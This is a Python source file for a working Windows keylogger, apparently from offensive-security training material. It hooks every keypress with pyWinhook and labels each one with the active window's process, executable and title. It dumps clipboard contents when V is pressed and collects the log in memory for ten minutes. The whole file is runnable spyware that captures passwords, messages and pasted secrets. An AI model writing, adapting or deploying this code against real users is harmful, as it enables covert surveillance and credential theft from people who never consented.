from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60 * 10


class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        # Capture the active window and its associated process ID
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f"{pid.value}"

        # Find the actual executable name of the process
        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

        # Get the full text of the window’s title bar
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)

        # Output in a header to see which keystrokes went with which process and window.
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f"[-] {e}: window name unknown")
        print("\n", process_id, executable.value.decode(), self.current_window)

        # clean up
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        # Check if the user has changed windows
        if event.WindowName != self.current_window:
            self.get_current_process()

        # If keystroke is within the ASCII-printable range, print it
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end="")

        # If a nonstandard key
        else:
            if event.Key == "V":
                # If a paste operation, dump contents of the clipboard
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f"[PASTE] - {value}")
            else:
                # Take the key name from the event object
                print(f"{event.Key}")
        # Return True to allow the next hook in the chain
        return True


def run():
    # Switch stdout to a file-like object
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    # Create the KeyLogger object and define the PyWinHook HookManager
    kl = KeyLogger()
    hm = pyHook.HookManager()

    # Bind the KeyDown event to the KeyLogger callback method mykeystroke
    hm.KeyDown = kl.mykeystroke

    # Hook all key presses and continue execution until we time out
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log


if __name__ == "__main__":
    print(run())
    print("[+] done.")
